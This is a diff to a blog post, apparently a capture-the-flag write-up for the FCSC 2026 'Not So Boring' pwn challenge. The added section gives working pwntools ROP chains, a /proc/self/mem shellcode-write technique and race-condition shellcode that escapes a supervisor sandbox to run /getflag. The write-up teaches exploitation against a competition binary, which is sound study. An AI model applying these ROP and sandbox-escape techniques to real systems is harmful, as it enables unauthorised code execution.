@@ -9,7 +9,7 @@ categories = ["Hackropole"]
 **Difficulty : ★★★**  
 **Number of solves : 7**
 
-This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition.  
+This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition. It was one of the 2 challenges I didn't had time to solve during the comp.  
 Not So Boring was a 3 Star challenge and the least solved challenge of this year.  
 You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2026/NotSoBoring/). Note that I changed the local getflag so that it reads the flag.txt in current directory instead of /flag.txt, on the docker-compose.yml it reads the right flag.
 
@@ -360,7 +360,135 @@ Remember that we have libc leaks. The other libraries, and more importantly the 
 
 ## Exploitation ##
 So we have a race condition, but now we need find the way to actually execute unsandboxed code.  
-My first problem was managing to trigger the race. We know we have to poll the supervisor for it to call **handle_ipc_command** then race the command so that it eventually jumps to a different location.
+My first problem was managing to trigger the race. We know we have to poll the supervisor for it to call **handle_ipc_command** then race the command so that it eventually jumps to a different location.  
+The two ways to trigger the supervisor are using a hooked function or sending a write to fd 6. I tried different ways of triggering the race and found that the most optimal was probably to use direct assembly instructions.  
+And that's when my failed attempt of **/proc/parent/mem** proved useful. We don't have a normal way of sending a shellcode on an executable memory, however it made me think of just using **/proc/self/mem** to directly write shellcode into rx memory. Since we can use open and pwrite (from the normal libc) it is doable.
+We start by using a read ropchain to send our shellcode into the bss, then returning to main for the second stage. I separated the first two stages mainly because if the payload is too long it gets other problems in verifications of the main program.
+```python
+    payload = b'A'*3
+    payload += filename #write filename in the bss where buf is
+    payload += b'A'*(69-len(filename))
+    payload += p64(canary)
+    payload += b'B'*8
+    payload += flat(
+        ret,
+        #first stage calls read to send shellcode where we want
+        pop_rdi,
+        0,
+        pop_rsi,
+        elf.address+0x5600, #this is just bss
+        pop_rdx,
+        len(shellcode),
+        read_addr,
+
+        ret, #just so it doesn't do annoying shit before going back to main
+        elf.sym['main']
+
+    )
+```
+Then the second stage : open/pwrite ropchain to write the shellcode into rx memory. And finally we jump on the shellcode to execute it.
+```python
+    #send a second payload to not mess mail format
+    payload2 = b'A'*3
+    payload2 += filename #write /proc/self/mem in the bss where buf is
+    payload2 += b'A'*(69-len(filename))
+    payload2 += p64(canary)
+    payload2 += b'B'*8
+    payload2 += flat(
+        ret,
+        
+        pop_rdi,
+        elf.address+0x526c, # addr of /proc/self/mem in our payload buffer
+        pop_rsi,
+        2,
+        open_addr,
+
+        pop_rdx_rcx_rbx,
+        len(shellcode),
+        sc_address,#unused rx in binary
+        0,
+        pop_rsi,
+        elf.address+0x5600, #addr of our shellcode in bss
+        xchg_rdi_rax, #to get the fd returned by open in rdi for pwrite
+        pwrite_addr,
+
+        sc_address #finally we jump on the shellcode
+
+    )
+```
+
+Now for the shellcode remember we want first to do a race condition, the race will calculate the address AT WHICH it gets a number with which added to rax ([rdi]) will calculate the address to jump to.  
+Since we can write as we want in the shared_mem, I decided to make the function calculate an address landing in shared_mem and at this address put a number that will jump where I want.  
+We can't directly reach the binary, but we can reach the other libraries, after some digging in libc gadgets I found one that allows to jmp to **[rdi+0x6d]**. So it jumps to the address contained further into the shared_mem. We will put that the final address we want to jump to. Note that we can't jump back to shellcode since he is only in child memory and at this point we execute code in the supervisor.
+We can however simply jump back to main : then we abuse the overflow without a sandbox.
+```python
+rdi_value = ((shm_mailbox+16)-(sandbox.address+0x22e4))//4 #value on local
+rdi_u64 = rdi_value & 0xFFFFFFFFFFFFFFFF
+
+#offset is 0xfff0a5b9 in remote and 0xfff0c5b9 in local
+
+shellcode = asm(f"""
+        mov r8, {shm_mailbox} ; we just use r8 for the movs i need into shared_mem
+        mov dword ptr [r8], 1 ; the is_ready
+        mov qword ptr [r8+8], 0 ; start sending a valid cmd (system)
+        mov r9, {elf.address} ; honestly don't remember if this is useful :)
+        mov qword ptr [r8+24], r9
+        mov dword ptr [r8+16], 0xfff0a5b9 ; this is nb calculating addr of jmp
+        mov r9, {elf.sym['main']+1} ;placing main where we want
+        mov qword ptr [r8+0x75], r9 ; our gadget will jmp to addr there -> main
+        mov r9, {hex(getflag)} ; to use later for system(/getflag)
+        push r9
+        pop qword ptr [r8+0x100]
+
+        jmp get_byte ; the byte of the IPC notif
+        byte_val:
+            .byte 1
+
+        get_byte:
+            lea rsi, [rip + byte_val]   
+            mov edi, 6                  
+            mov edx, 1                  
+            mov eax, 1                  
+            syscall ; we use a write to send the byte IPC notif to supervisor
+
+        mov r12, {rdi_u64} ; computing addr used to access our jmp nb
+        race_loop: ; finally the actual race
+            mov qword ptr [r8+8], r12
+            mov qword ptr [r8+8], 0
+            jmp race_loop
+    """)
+```
+Our shellcode use the shared_mem for everything we need for the exploitation first. It writes a valid cmd number, write **/getflag** into it since system takes an address as argument. It writes into **shared_mem** the address that the **jmp [rdi+0x6d]** will jump to (again rdi points to shared_mem +8), as well as the number that added to rax will make the jump to the gadget address.
+Finally we race putting into the command in shared_mem a calculated number.  
+
+When the race works it will move into rax the fake cmd number we sent. Then it will computes that to access the number stored in **shared_mem+16**, there the number we put will calculate an address landing on the libc gadget.
+Finally this libc gadget will access **shared_mem+0x75**, which makes us loop back to main as supervisor and thus we escaped the sandbox.  
+
+All that is left to do is exploit the overflow normally and call **/getflag**.
+```python
+    payload3 = b'A'*3
+    payload3 += filename #write filename in the bss where buf is
+    payload3 += b'A'*(69-len(filename))
+    payload3 += p64(canary)
+    payload3 += b'B'*8
+    payload3 += flat(
+        ret,
+        pop_rdi,
+        shm_mailbox+0x100, #addr of /getflag
+        pop_rsi,
+        0,
+        pop_rdx,
+        0,
+        pop_rax,
+        0x3b,
+        syscall
+
+    )
+```
+And finally after several loops we get the flag :)  
+![flag](/images/FCSC2026/NotSoBoring/flag.png)
 
 ## Conclusion ##
-For a one star challenge I thought the vulnerabilities were not the most obvious ones usually found in easy challenges. But there wasn't much difficulty in this challenge. Its harder version was way more interesting.
+The challenge was very interesting, I was far too exhausted during the competition to manage to think straight. But I am still happy solving it later. The vulnerability was not really seen in the code and only in the disassembly.  
+And the path to exploitation was original enough and required several different steps and calculations.  
+Overall, one of my favorite challenge. Thanks voydstack (the pwn goat) for the chal :)
